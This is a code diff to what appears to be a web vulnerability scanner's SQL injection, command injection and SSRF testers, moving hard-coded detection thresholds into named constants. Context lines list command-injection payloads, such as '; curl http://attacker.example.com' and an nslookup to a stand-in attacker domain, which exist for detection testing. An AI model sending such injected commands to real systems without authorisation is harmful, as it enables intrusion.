@@ -446,6 +446,12 @@ class SQLiTester(_BaseTester):
     # Number of consistency rounds
     _CONSISTENCY_ROUNDS = 5
 
+    # Consistency tolerance — max allowed deviation among repeated measurements
+    _CONSISTENCY_TOLERANCE = 0.08  # 8%
+
+    # Minimum timing delta (seconds) over baseline for time-based detection
+    _TIME_DELAY_THRESHOLD = 3.0
+
     def test(
         self, url: str, method: str, param: str, value: str,
     ) -> list[ScanFinding]:
@@ -495,9 +501,9 @@ class SQLiTester(_BaseTester):
             false_lengths.append(len(fr.text))
 
         # Check consistency: all true responses should have similar length
-        if not self._lengths_consistent(true_lengths):
+        if not self._lengths_consistent(true_lengths, self._CONSISTENCY_TOLERANCE):
             return None
-        if not self._lengths_consistent(false_lengths):
+        if not self._lengths_consistent(false_lengths, self._CONSISTENCY_TOLERANCE):
             return None
 
         n = self._CONSISTENCY_ROUNDS
@@ -558,8 +564,8 @@ class SQLiTester(_BaseTester):
                 elapsed = time.time() - start
                 delays.append(elapsed)
 
-            # All 3 must show > 3s increase over baseline
-            if all(d - avg_baseline > 3.0 for d in delays):
+            # All 3 must show > _TIME_DELAY_THRESHOLD increase over baseline
+            if all(d - avg_baseline > self._TIME_DELAY_THRESHOLD for d in delays):
                 return ScanFinding(
                     vuln_class="SQL Injection (Time-Based Blind)",
                     url=url,
@@ -847,6 +853,9 @@ class CMDiTester(_BaseTester):
         "| timeout 5",
     ]
 
+    # Minimum timing delta (seconds) over baseline for time-based detection
+    _TIME_DELAY_THRESHOLD = 3.0
+
     _OOB_PAYLOADS = [
         "; nslookup test.attacker.example.com",
         "; curl http://attacker.example.com",
@@ -948,8 +957,8 @@ class CMDiTester(_BaseTester):
                 elapsed = time.time() - start
                 delays.append(elapsed)
 
-            # All 3 must show > 3s increase over baseline
-            if all(d - avg_baseline > 3.0 for d in delays):
+            # All 3 must show > _TIME_DELAY_THRESHOLD increase over baseline
+            if all(d - avg_baseline > self._TIME_DELAY_THRESHOLD for d in delays):
                 return ScanFinding(
                     vuln_class="Command Injection (Blind/Time-Based)",
                     url=url,
@@ -998,6 +1007,9 @@ class SSRFTester(_BaseTester):
         "invalid url",
         "malformed",
     ]
+
+    # Minimum response-length differential ratio for behavioural detection
+    _BEHAVIOURAL_DIFF_THRESHOLD = 0.50  # 50%
 
     def test(
         self, url: str, method: str, param: str, value: str,
@@ -1054,11 +1066,11 @@ class SSRFTester(_BaseTester):
 
             # Behavioural differential: significant length/status change
             length_diff = abs(len(body) - baseline_len)
-            if baseline_len > 0 and length_diff / baseline_len > 0.5:
+            if baseline_len > 0 and length_diff / baseline_len > self._BEHAVIOURAL_DIFF_THRESHOLD:
                 if resp.status_code == 200 and baseline_status == 200:
                     # Verify once more
                     resp2 = self._send(url, method, param, payload)
-                    if resp2 and abs(len(resp2.text) - baseline_len) / max(baseline_len, 1) > 0.5:
+                    if resp2 and abs(len(resp2.text) - baseline_len) / max(baseline_len, 1) > self._BEHAVIOURAL_DIFF_THRESHOLD:
                         findings.append(ScanFinding(
                             vuln_class="SSRF (Server-Side Request Forgery)",
                             url=url,
